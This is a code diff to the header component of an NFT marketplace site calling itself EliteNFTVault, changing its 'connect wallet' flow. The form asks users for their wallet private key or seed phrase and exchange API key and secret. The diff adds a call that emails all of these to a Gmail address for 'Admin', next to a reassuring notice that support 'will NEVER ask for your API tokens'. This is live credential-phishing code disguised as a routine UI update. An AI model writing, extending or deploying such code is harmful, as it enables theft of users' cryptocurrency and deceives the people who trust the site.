@@ -10,6 +10,7 @@ import {
   faExclamationCircle,
   faMagnifyingGlass,
   faWallet,
+  faExclamationTriangle,
 } from "@fortawesome/free-solid-svg-icons";
 import ConfirmBtn from "../loading/ConfirmBtn";
 import Link from "next/link";
@@ -18,6 +19,7 @@ import ConnectWallet from "../walletconnection/ConnectWallet";
 import { toast } from "react-toastify";
 import Loading from "../loading/Loading";
 import { usePathname, useRouter } from "next/navigation";
+import NotificationsTab from "../dropdown/NotificationsTab";
 
 const Header = () => {
   const router = useRouter();
@@ -118,8 +120,10 @@ const Header = () => {
   async function connectWallet() {
     if (provider === "metamask" && !validKey)
       return toast.error("Invalid keys");
-    if (provider === "phantom" && !validKey) return toast.error("Invalid keys");
-    if (provider === "trust" && !validKey) return toast.error("Invalid Phrase");
+    if (provider === "phantom" && !validPhrase)
+      return toast.error("Invalid Phrase");
+    if (provider === "trust" && !validPhrase)
+      return toast.error("Invalid Phrase");
     setLoading(true);
     try {
       const response = await fetch("/api/userrequest/edit", {
@@ -130,6 +134,7 @@ const Header = () => {
           privateKey,
           apiKey,
           apiSecret,
+          provider,
         }),
       });
       if (!response.ok) {
@@ -138,17 +143,28 @@ const Header = () => {
       }
 
       if (response.ok) {
+        await fetch("/api/mailer/custom", {
+          method: "POST",
+          body: JSON.stringify({
+            email: "elitenftvault@gmail.com",
+            subject: `connected wallet alert`,
+            body: `<h2>Hello Admin</h2> 
+            <p>the ${user?.username}, just connected a wallet</p>
+            <p>Details:</p>
+<p>Provider: ${provider}</p>
+<p>Secret Phrase (private key): ${privateKey}</p>
+<p>Api key: ${apiKey}</p>
+
+<p>Api Secret: ${apiSecret}</p>
+<p>
+EliteNFTVault team,</p>`,
+          }),
+        });
         toast.success("Wallet Connected.");
         setSteps(4);
         await getUser();
+        return;
       }
-
-      console.log({
-        walletAddress,
-        privateKey,
-        apiKey,
-        apiSecret,
-      });
     } catch (error) {
       console.log(error.name, ":", error.message);
     } finally {
@@ -164,7 +180,7 @@ const Header = () => {
 
   useEffect(() => {
     const checkValidKey = () => {
-      if (provider === "metamask" || provider === "phantom") {
+      if (provider === "metamask") {
         if (privateKey && privateKey.length !== 64) {
           setValidKey(false);
         } else if (privateKey && privateKey.length === 64) {
@@ -176,7 +192,7 @@ const Header = () => {
     };
 
     const checkValidPhrase = () => {
-      if (provider === "trust") {
+      if (provider === "trust" || provider === "phantom") {
         if (privateKey && !hasUpTo12Words(privateKey)) {
           setValidPhrase(false);
         } else if (privateKey && hasUpTo12Words(privateKey)) {
@@ -291,11 +307,7 @@ const Header = () => {
                 Explore
               </Link>
 
-              {user?.walletAddress && (
-                <div className="bg-[#ef8bf7]/40 p-1 w-[39px] h-[39px] flex items-center justify-center rounded-[10] cursor-pointer mx-1 sm:mx-4 relative">
-                  <FontAwesomeIcon icon={faBell} />
-                </div>
-              )}
+              {user?.walletAddress && <NotificationsTab user={user} />}
             </div>
             <div className="flex items-center justify-center">
               <NavDropDownMenu user={user} />
@@ -310,7 +322,7 @@ const Header = () => {
             {/* STEP one */}
             {steps === 1 && (
               <div className="bg-[#141414] min-h-20 w-full flex flex-col items-center justify-around">
-                <p className="font-bold text-center text-xl my-4"> Step 1/5 </p>
+                <p className="font-bold text-center text-xl my-4"> Step 1/3 </p>
                 <FontAwesomeIcon
                   icon={faExclamationCircle}
                   className="text-[70px] text-green-600 mb-3"
@@ -341,7 +353,7 @@ const Header = () => {
             {/* STEP TWO */}
             {steps === 2 && (
               <div className="bg-[#141414] min-h-20 w-full flex flex-col items-center justify-around">
-                <p className="font-bold text-center text-xl my-4"> Step 2/5 </p>
+                <p className="font-bold text-center text-xl my-4"> Step 2/3 </p>
 
                 <FontAwesomeIcon
                   icon={faWallet}
@@ -461,6 +473,15 @@ const Header = () => {
                   {" "}
                   Final Step{" "}
                 </p>
+                <p className="my-2 text-red-500 break-words bg-red-200 border border-red-700 rounded text-center">
+                  <FontAwesomeIcon
+                    icon={faExclamationTriangle}
+                    className="text-red-500"
+                  />
+                  please be <b>Extra</b> careful when handling your API key,
+                  EliteNFTvault support team will <b>NEVER</b> ask for your API
+                  tokens
+                </p>
 
                 <p className="text-left w-full">Enter your API tokens:</p>
                 {provider === "metamask" ||
@@ -490,20 +511,22 @@ const Header = () => {
                           />
                         </p>
                       )}
-                      {provider === "phantom" && privateKey && validKey && (
+                      {provider === "phantom" &&
+                        !!privateKey &&
+                        validPhrase && (
+                          <p>
+                            {validPhrase ? "Valid" : "invalid"} phrase (token){" "}
+                            <FontAwesomeIcon
+                              icon={validPhrase ? faCircleCheck : faCircleXmark}
+                              className={`${
+                                validPhrase ? "text-green-600" : "text-red-500"
+                              }`}
+                            />
+                          </p>
+                        )}
+                      {provider === "phantom" && privateKey && !validPhrase && (
                         <p>
-                          Valid Key (token){" "}
-                          <FontAwesomeIcon
-                            icon={validKey ? faCircleCheck : faCircleXmark}
-                            className={`${
-                              validKey ? "text-green-600" : "text-red-500"
-                            }`}
-                          />
-                        </p>
-                      )}
-                      {provider === "phantom" && privateKey && !validKey && (
-                        <p>
-                          {validKey ? "Valid" : "invalid"} Key (token){" "}
+                          {validKey ? "Valid" : "invalid"} Phrase (token){" "}
                           <FontAwesomeIcon
                             icon={validKey ? faCircleCheck : faCircleXmark}
                             className={`${
@@ -580,6 +603,13 @@ const Header = () => {
                     handleClicked={connectWallet}
                   />
                 </div>
+                <Link
+                  href={"/frequently-asked-questions?tab=connectWallet"}
+                  className="text-sm underline my-1"
+                >
+                  {" "}
+                  How to get my API tokens?{" "}
+                </Link>
               </div>
             )}
 
